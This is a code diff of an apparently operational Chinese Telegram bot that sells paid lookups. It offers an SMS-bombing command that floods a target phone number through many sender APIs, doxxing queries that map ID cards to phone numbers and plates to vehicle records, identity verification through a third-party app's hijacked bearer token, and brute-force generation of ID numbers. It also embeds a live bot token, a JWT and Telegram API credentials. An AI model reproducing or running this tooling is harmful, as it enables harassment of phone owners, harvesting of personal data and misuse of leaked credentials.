@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import telebot
 import requests
 import time
@@ -8,18 +5,19 @@ import re
 import threading
 import json
 import os
-import sys
-import asyncio
 import itertools
 import binascii
 import random
 import concurrent.futures
 import inspect  
 import urllib.parse
+import sms_list 
+import sms_list_new
+from sms_list import *
+from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from concurrent.futures import ThreadPoolExecutor
 
 # 屏蔽 SSL 证书报警
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -30,45 +28,25 @@ API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
 ADMIN_ID = 6649617045 
 ADMIN_USERNAME = "@aaSm68"
 POINTS_FILE = 'points.json'
+
+# 二要素接口授权 Token
 AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"
 
-# Telegram 用户号配置
-TG_API_ID = 2040
-TG_API_HASH = "b18441a1ff607e10a989891a5462e627"
-USER_PHONE = '+243991464642'
-SIGN_IN_BOTS = [
-    {"name": "山东小纸条", "bot_username": "sdxhzbot", "command": "/qd"},
-    {"name": "今日社工库", "bot_username": "jrsgk6_bot", "command": "/checkin"},
-    {"name": "好望社工库", "bot_username": "haowangshegongkubot", "command": "/sign"},
-    {"name": "优享", "bot_username": "youxs520_bot", "command": "/sign"},
-    {"name": "云储", "bot_username": "yunchu_bot", "command": "/qd"},
-    {"name": "mw社工库", "bot_username": "mwsgkbot", "command": "/qd"}
-]
-
-# 全局变量
 bot = telebot.TeleBot(API_TOKEN)
 user_points = {}
 user_states = {}
-sign_in_status = {}
+generated_cache = {} 
 
-# 导入测压模块
-try:
-    import sms_list 
-    import sms_list_new
-    from sms_list import *
-except:
-    pass
-
-# ================= 2. 数据持久化 =================
-
+# --- 数据持久化 ---
 def load_data():
+    pts = {}
     if os.path.exists(POINTS_FILE):
         try:
             with open(POINTS_FILE, 'r') as f:
                 data = json.load(f)
-                return {int(k): float(v) for k, v in data.items()}
+                pts = {int(k): float(v) for k, v in data.items()}
         except: pass
-    return {}
+    return pts
 
 user_points = load_data()
 
@@ -76,45 +54,95 @@ def save_points():
     with open(POINTS_FILE, 'w') as f:
         json.dump({str(k): v for k, v in user_points.items()}, f)
 
-# ================= 3. 用户号自动签到逻辑 (协程) =================
+# ================= 2. 功能逻辑 =================
 
-async def run_sign_in_task(client):
-    print("📅 [系统] 自动签到协程已就绪")
-    while True:
-        try:
-            now = datetime.now()
-            # 每天 12点 和 0点 执行
-            if now.hour in [12, 0] and now.minute == 0:
-                print(f"🚀 [签到] 开始执行例行签到...")
-                for b in SIGN_IN_BOTS:
-                    try:
-                        await client.send_message(b['bot_username'], b['command'])
-                        sign_in_status[b['name']] = f"✅ {now.strftime('%m-%d %H:%M')}"
-                        await asyncio.sleep(random.randint(3, 7))
-                    except Exception as e:
-                        sign_in_status[b['name']] = f"❌ 失败"
-                await asyncio.sleep(60) # 防止在同一分钟重复触发
-            await asyncio.sleep(30)
-        except Exception as e:
-            await asyncio.sleep(30)
+def cp_query_logic(chat_id, car_no, uid):
+    # 车档接口地址
+    url = f"http://zgzapi.idc.cn.com/车档.php?key=体验卡&cph={urllib.parse.quote(car_no)}"
+    try:
+        response = requests.get(url, timeout=15)
+        response.encoding = 'utf-8'
+        raw_res = response.text.strip()
+        
+        # 判断是否有结果
+        if raw_res and "未找到" not in raw_res and "错误" not in raw_res:
+            # 扣除 2.5 积分
+            user_points[uid] -= 2.5
+            save_points()
+            
+            message = (f"车牌查询结果:\n\n"
+                       f"车牌号：{car_no}\n"
+                       f"详细信息：\n{raw_res}\n\n"
+                       f"已扣除 2.5 积分！\n"
+                       f"当前余额: {user_points[uid]:.2f}")
+        else:
+            message = (f"车牌查询结果:\n\n"
+                       f"未匹配到有效车档信息。\n\n"
+                       f"查询无结果，未扣除积分。\n"
+                       f"当前余额: {user_points[uid]:.2f}")
+            
+        bot.send_message(chat_id, message)
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ 车档接口请求失败: {str(e)}")
 
-async def init_user_client():
-    client = TelegramClient("my_account.session", TG_API_ID, TG_API_HASH)
-    await client.connect()
-    if not await client.is_user_authorized():
-        print(f"🚨 [账号] 未检测到登录状态，开始验证: {USER_PHONE}")
-        await client.send_code_request(USER_PHONE)
-        code = input("请输入手机收到的 Telegram 验证码: ")
-        try:
-            await client.sign_in(USER_PHONE, code)
-        except SessionPasswordNeededError:
-            password = input("请输入两步验证密码: ")
-            await client.sign_in(password=password)
-    print("✅ [账号] 用户号登录成功")
-    asyncio.create_task(run_sign_in_task(client))
-    return client
+def xiaowunb_query_logic(chat_id, id_number, uid):
+    base_url = "http://xiaowunb.top/cyh.php"
+    params = {"sfz": id_number}
+    try:
+        response = requests.get(base_url, params=params, timeout=10)
+        response.encoding = 'utf-8'
+        raw_text = response.text.strip()
+        phones = re.findall(r'1[3-9]\d{9}', raw_text)
+        
+        if phones:
+            user_points[uid] -= 1.5
+            save_points()
+            unique_phones = list(dict.fromkeys(phones))
+            phone_list_str = ""
+            for idx, p in enumerate(unique_phones, 1):
+                phone_list_str += f"{idx}、{p}\n"
+            result_body = f"匹配到 {len(unique_phones)} 个有效手机号:\n{phone_list_str}"
+            cost_str = f"已扣除 1.5 积分！"
+        else:
+            result_body = "未匹配到有效手机号\n"
+            cost_str = "查询无结果，未扣除积分。"
 
-# ================= 4. 业务功能函数 =================
+        result_message = (f"身份证查询结果:\n\n{result_body}\n{cost_str}\n当前余额: {user_points[uid]:.2f}")
+        bot.send_message(chat_id, result_message)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")
+
+def query_3ys_logic(chat_id, name, id_card, phone, uid):
+    url = "http://xiaowunb.top/3ys.php"
+    params = {"name": name, "sfz": id_card, "sjh": phone}
+    try:
+        response = requests.get(url, params=params, timeout=15)
+        response.encoding = 'utf-8'
+        user_points[uid] -= 0.05
+        save_points()
+        raw_res = response.text.strip()
+        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', raw_res, flags=re.DOTALL).strip()
+        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
+        message = (f"名字：{name}\n手机号：{phone}\n身份证：{id_card}\n结果：{res_status}\n\n已扣除 0.05 积分！\n当前积分余额：{user_points[uid]:.2f} 积分")
+        bot.send_message(chat_id, message)
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ 系统异常: {str(e)}")
+
+def single_verify_2ys(chat_id, name, id_card, uid):
+    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
+    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
+    try:
+        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
+        user_points[uid] -= 0.01
+        save_points()
+        res_json = r.json()
+        res_type = "二要素核验一致✅" if res_json.get("success") else f"二要素验证失败 ❌"
+        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.01** 积分！\n当前余额：**{user_points[uid]:.2f}**")
+        bot.send_message(chat_id, res, parse_mode='Markdown')
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ 接口请求失败: {str(e)}")
+
+# ================= 3. UI/菜单函数 =================
 
 def get_id_check_code(id17):
     factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
@@ -124,64 +152,26 @@ def get_id_check_code(id17):
         return rem_map[sum_val % 11]
     except: return "X"
 
-def cp_query_logic(chat_id, car_no, uid):
-    url = f"http://zgzapi.idc.cn.com/车档.php?key=体验卡&cph={urllib.parse.quote(car_no)}"
-    try:
-        response = requests.get(url, timeout=15)
-        response.encoding = 'utf-8'
-        raw_res = response.text.strip()
-        if raw_res and "未找到" not in raw_res and "错误" not in raw_res:
-            user_points[uid] -= 2.5
-            save_points()
-            bot.send_message(chat_id, f"车牌查询结果:\n\n车牌号：{car_no}\n详细信息：\n{raw_res}\n\n已扣除 2.5 积分！\n当前余额: {user_points[uid]:.2f}")
-        else:
-            bot.send_message(chat_id, f"车牌查询结果:\n\n未匹配到有效车档信息。\n\n查询无结果，不扣分。\n余额: {user_points[uid]:.2f}")
-    except:
-        bot.send_message(chat_id, "⚠️ 接口请求失败")
+def get_main_markup():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"), types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
+    return markup
 
-def xiaowunb_query_logic(chat_id, id_number, uid):
-    base_url = "http://xiaowunb.top/cyh.php"
-    try:
-        response = requests.get(base_url, params={"sfz": id_number}, timeout=10)
-        response.encoding = 'utf-8'
-        phones = re.findall(r'1[3-9]\d{9}', response.text)
-        if phones:
-            user_points[uid] -= 1.5
-            save_points()
-            unique_phones = list(dict.fromkeys(phones))
-            phone_list = "\n".join([f"{idx+1}、{p}" for idx, p in enumerate(unique_phones)])
-            bot.send_message(chat_id, f"身份证查询结果:\n\n匹配到 {len(unique_phones)} 个手机号:\n{phone_list}\n\n已扣除 1.5 积分！")
-        else:
-            bot.send_message(chat_id, "未匹配到有效手机号，不扣分。")
-    except:
-        bot.send_message(chat_id, "❌ 接口超时")
+def get_pay_markup():
+    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url), types.InlineKeyboardButton("OkPay 充值", url=admin_url), types.InlineKeyboardButton("RMB 充值", url=admin_url), types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
+    return markup
 
-def query_3ys_logic(chat_id, name, id_card, phone, uid):
-    url = "http://xiaowunb.top/3ys.php"
-    try:
-        response = requests.get(url, params={"name": name, "sfz": id_card, "sjh": phone}, timeout=15)
-        response.encoding = 'utf-8'
-        user_points[uid] -= 0.05
-        save_points()
-        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', response.text, flags=re.DOTALL).strip()
-        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
-        bot.send_message(chat_id, f"姓名：{name}\n手机：{phone}\n结果：{res_status}\n\n已扣 0.05 积分！\n余额：{user_points[uid]:.2f}")
-    except:
-        bot.send_message(chat_id, "⚠️ 系统异常")
+def get_help_markup():
+    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
 
-def single_verify_2ys(chat_id, name, id_card, uid):
-    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
-    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json"}
-    try:
-        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
-        user_points[uid] -= 0.01
-        save_points()
-        res_type = "核验一致✅" if r.json().get("success") else "验证失败 ❌"
-        bot.send_message(chat_id, f"姓名: {name}\n结果: {res_type}\n\n已扣 0.01 积分！\n余额：{user_points[uid]:.2f}")
-    except:
-        bot.send_message(chat_id, "❌ 接口报错")
+def get_main_text(source, uid, pts):
+    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
+    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
+    return (f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分")
 
-# ================= 5. 短信测压 =================
+# ================= 短信测压 =================
 
 def get_all_senders():
     all_funcs = []
@@ -192,6 +182,9 @@ def get_all_senders():
                 sig = inspect.signature(obj)
                 if len(sig.parameters) >= 1: all_funcs.append(obj)
             except: pass
+    if hasattr(sms_list_new, 'NEW_PLATFORMS'):
+        for name, func in sms_list_new.NEW_PLATFORMS:
+            if func not in all_funcs: all_funcs.append(func)
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -202,154 +195,175 @@ def sms_bomb_cmd(message):
     if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
-    
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
     user_points[uid] -= 3.5; save_points()
-    
     def do_bomb():
         random.shuffle(all_funcs)
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
             for func in all_funcs: executor.submit(func, target)
-        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务完毕")
+        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
     threading.Thread(target=do_bomb).start()
 
-# ================= 6. 界面与指令控制 =================
+# ================= 指令入口 =================
 
-def get_main_markup():
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("使用帮助", callback_data="view_help"), 
-        types.InlineKeyboardButton("在线充值", callback_data="view_pay"),
-        types.InlineKeyboardButton("📋 签到状态", callback_data="view_sign")
-    )
-    return markup
-
-def get_pay_markup():
-    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("USDT/OkPay/RMB 充值", url=admin_url), 
-        types.InlineKeyboardButton("🔙 返回", callback_data="back_to_main")
-    )
-    return markup
-
-@bot.message_handler(commands=['start', 'cyh', '3ys', '2ys', 'cp', 'bq', 'add'])
+@bot.message_handler(commands=['cyh', '3ys', 'admin', 'add', 'start', 'bq', '2ys', 'cp'])
 def handle_commands(message):
     uid, chat_id = message.from_user.id, message.chat.id
     cmd = message.text.split()[0][1:]
     
+    if cmd in ['add', 'admin'] and uid != ADMIN_ID:
+        return bot.reply_to(message, "🤡你没有权限使用该指令…")
+
     if cmd == 'start':
         if uid not in user_points: user_points[uid] = 0.0
-        txt = f"Admin@铭\n\n用户 ID: `{uid}`\n当前余额: `{user_points[uid]:.2f}积分`"
-        bot.send_message(chat_id, txt, parse_mode='Markdown', reply_markup=get_main_markup())
+        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())
     elif cmd == 'add' and uid == ADMIN_ID:
         try:
             p = message.text.split(); tid, amt = int(p[1]), float(p[2])
             user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
-            bot.reply_to(message, f"✅ 充值成功！余额: `{user_points[tid]:.2f}`")
+            bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
         except: pass
     elif cmd == 'cyh':
+        if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "积分不足，请先充值！")
         user_states[chat_id] = {'step': 'cyh_id'}; bot.send_message(chat_id, "请输入要查询的身份证号：")
-    elif cmd == 'cp':
-        user_states[chat_id] = {'step': 'v_cp'}; bot.send_message(chat_id, "请输入车牌号：")
     elif cmd == '3ys':
-        user_states[chat_id] = {'step': 'v_3ys'}; bot.send_message(chat_id, "请输入：姓名 手机号 身份证")
-    elif cmd == '2ys':
-        user_states[chat_id] = {'step': 'v_2ys'}; bot.send_message(chat_id, "请输入：姓名 身份证")
+        if user_points.get(uid, 0.0) < 0.05: return bot.reply_to(message, "积分不足，请先充值！")
+        user_states[chat_id] = {'step': 'v_3ys'}; bot.send_message(chat_id, "请输入姓名 手机号 身份证")
     elif cmd == 'bq':
-        user_states[chat_id] = {'step': 'g_card'}; bot.send_message(chat_id, "请输入身份证号（未知位用x）：")
+        if user_points.get(uid, 0.0) < 0.1: return bot.reply_to(message, "积分不足，请先充值！")
+        user_states[chat_id] = {'step': 'g_card'}; bot.send_message(chat_id, "请输入身份证号（未知用x）：")
+    elif cmd == '2ys':
+        if user_points.get(uid, 0.0) < 0.01: return bot.reply_to(message, "积分不足，请先充值！")
+        user_states[chat_id] = {'step': 'v_2ys'}; bot.send_message(chat_id, "请输入姓名 身份证")
+    elif cmd == 'cp':
+        if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)")
+        user_states[chat_id] = {'step': 'v_cp'}; bot.send_message(chat_id, "请输入要查询的车牌号：")
+
+# ================= 自动识别逻辑 =================
 
 @bot.message_handler(func=lambda m: True)
-def handle_all_msg(message):
+def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
-    if text.startswith('/'): return
+    if text.startswith('/'): return 
     
-    # 状态机逻辑
-    state = user_states.get(chat_id)
-    if state:
-        step = state.get('step')
-        if step == 'v_cp':
-            del user_states[chat_id]; cp_query_logic(chat_id, text.upper(), uid)
-        elif step == 'cyh_id':
-            del user_states[chat_id]; xiaowunb_query_logic(chat_id, text, uid)
-        elif step == 'v_3ys':
-            del user_states[chat_id]
-            parts = re.split(r'[,，\s\n]+', text)
-            if len(parts) >= 3: query_3ys_logic(chat_id, parts[0], parts[2], parts[1], uid)
-        elif step == 'v_2ys':
-            del user_states[chat_id]
-            parts = re.split(r'[,，\s\n]+', text)
-            if len(parts) >= 2: single_verify_2ys(chat_id, parts[0], parts[1], uid)
-        elif step == 'g_card':
-            user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
-            bot.send_message(chat_id, "请输入性别 (男/女):")
-        elif step == 'g_sex':
-            user_points[uid] -= 0.1; save_points()
-            base_17 = state['card'][:17]
-            char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
-            if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
-            else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
-            ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
-            with open("铭.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
-            with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！消耗0.1积分")
-            del user_states[chat_id]
-        return
+    if chat_id not in user_states or not user_states[chat_id].get('step'):
+        # 1. 自动识别车牌
+        if re.match(r'^[京津沪渝冀豫云辽黑湖南皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼]{1}[A-Z]{1}[A-Z0-9]{5,6}$', text.upper()):
+            if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "❌ 积分不足(2.5)")
+            return cp_query_logic(chat_id, text.upper(), uid)
 
-    # 自动识别逻辑
-    if re.match(r'^[京津沪渝冀豫云辽黑湖南皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼]{1}[A-Z]{1}[A-Z0-9]{5,6}$', text.upper()):
-        if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)")
-        cp_query_logic(chat_id, text.upper(), uid)
-    elif re.match(r'^\d{17}[\dXx]$|^\d{15}$', text):
-        if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "积分不足(1.5)")
-        xiaowunb_query_logic(chat_id, text, uid)
+        parts = re.split(r'[,，\s\n]+', text.strip())
+        
+        if len(parts) >= 3:
+            n, p, i = None, None, None
+            for x in parts:
+                if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
+                elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
+                elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
+            if n and p and i:
+                if user_points.get(uid, 0.0) < 0.05: return bot.reply_to(message, "❌ 积分不足(0.05)")
+                return query_3ys_logic(chat_id, n, i, p, uid)
+        
+        if len(parts) == 2:
+            n, i = None, None
+            for x in parts:
+                if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
+                elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
+            if n and i:
+                if user_points.get(uid, 0.0) < 0.01: return bot.reply_to(message, "❌ 积分不足(0.01)")
+                return single_verify_2ys(chat_id, n, i, uid)
+                
+        if re.match(r'^\d{17}[\dXx]$|^\d{15}$', text):
+            if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "❌ 积分不足(1.5)")
+            return xiaowunb_query_logic(chat_id, text, uid)
+
+    state = user_states.get(chat_id)
+    if not state: return
+    step = state['step']
+    
+    if step == 'v_cp':
+        del user_states[chat_id]
+        return cp_query_logic(chat_id, text.upper(), uid)
+    elif step == 'v_3ys':
+        del user_states[chat_id]
+        parts = re.split(r'[,，\s\n]+', text.strip())
+        n, p, i = None, None, None
+        for x in parts:
+            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
+            elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
+            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
+        if n and p and i: query_3ys_logic(chat_id, n, i, p, uid)
+        else: bot.reply_to(message, "格式错误")
+    elif step == 'cyh_id': 
+        del user_states[chat_id]
+        return xiaowunb_query_logic(chat_id, text, uid)
+    elif step == 'v_2ys': 
+        del user_states[chat_id]
+        parts = re.split(r'[,，\s\n]+', text.strip())
+        n, i = None, None
+        for x in parts:
+            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
+            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
+        if n and i: single_verify_2ys(chat_id, n, i, uid)
+        else: bot.reply_to(message, "格式错误")
+    elif step == 'g_card':
+        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
+        bot.send_message(chat_id, "请输入性别 (男/女):")
+    elif step == 'g_sex':
+        user_points[uid] -= 0.1; save_points()
+        base_17 = state['card'][:17]
+        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
+        if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
+        else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
+        ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
+        with open("铭.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
+        with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！消耗0.1积分")
+        del user_states[chat_id]
+
+# ================= 按钮点击事件 =================
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    uid = call.from_user.id
+    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
     if call.data == "view_help":
+        # 此处内容已恢复，你可以根据需要自行修改
         help_text = (
-            "🛠️️ **使用帮助**\n\n"
-            "🚀 **短信测压**: 发送 `/sms 手机号` (3.5积分)\n"
-            "🆔 **补齐身份证**: 发送 `/bq` 操作 (0.1积分)\n"
-            "✅ **二要素核验**: 发送 `/2ys` 姓名+身份证 (0.01积分)\n"
-            "✅ **三要素核验**: 发送 `/3ys` 姓名+手机+身份证 (0.05积分)\n"
-            "🚗 **车牌查询**: 发送 `/cp` 车牌号 (2.5积分)\n"
-            "🔍 **常用号查询**: 发送 `/cyh` 身份证 (1.5积分)\n"
+            "🛠️️使用帮助\n"
+            "短信测压\n"
+            "发送 /sms 手机号\n"
+            "每次消耗 3.5 积分\n"
             "——————————————————\n"
-            "💡 **自动识别**: 直接发送车牌或身份证即可自动查询"
+            "补齐身份证\n"
+            "发送 /bq 进行操作\n"
+            "每次补齐扣除 0.1 积分\n"
+            "——————————————————\n"
+            "名字-身份证核验（企业级）\n"
+            "全天24h秒出 毫秒级响应\n"
+            "发送 /2ys 进行核验\n"
+            "每次核验扣除 0.01 积分\n"
+            "——————————————————\n"
+            "名字-手机号-身份证核验（企业级）\n"
+            "全天24h秒出 毫秒级响应\n"
+            "发送 /3ys 进行核验\n"
+            "每次核验扣除 0.05 积分\n"
+            "——————————————————\n"
+            "车牌号查询\n"
+            "发送 /cp 进行查询\n"
+            "全天24h秒出 假1赔10000\n"
+            "每次查询扣除 2.5 积分 空不扣除积分"
+            "——————————————————\n"
+            "常用号查询\n"
+            "发送 /cyh 进行查询\n"
+            "全天24h秒出 假1赔10000\n"
+            "每次查询扣除 1.5 积分 空不扣除积分"
         )
-        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 返回", callback_data="back_to_main")))
+        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
     elif call.data == "view_pay":
-        bot.edit_message_text("🛍️ **充值方式**\n\n1 USDT = 1 积分\n联系管理充值，支持USDT/OkPay/RMB", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
-    elif call.data == "view_sign":
-        res = "📋 **自动签到监控**\n\n"
-        for name, stat in sign_in_status.items(): res += f"🔹 {name}: {stat}\n"
-        if not sign_in_status: res += "等待首次执行..."
-        bot.edit_message_text(res, call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 返回", callback_data="back_to_main")))
+        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
     elif call.data == "back_to_main":
-        txt = f"Admin@铭\n\n用户 ID: `{uid}`\n当前余额: `{user_points.get(uid,0.0):.2f}积分`"
-        bot.edit_message_text(txt, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())
+        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())
 
-# ================= 7. 启动入口 =================
-
-def run_bot():
-    print("🤖 [系统] 主机器人轮询已启动")
-    bot.infinity_polling()
-
-async def main():
-    # 初始化并登录用户号（如果需要验证码会在控制台弹出）
-    user_client = await init_user_client()
-    
-    # 在独立线程跑 Telebot，防止阻塞
-    threading.Thread(target=run_bot, daemon=True).start()
-    
-    # 保持主进程活跃
-    await user_client.run_until_disconnected()
-
-if __name__ == "__main__":
-    if sys.platform == "win32": os.system("chcp 65001 >nul")
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n停止运行")
+if __name__ == '__main__':
+    print("Bot 正在运行...")
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
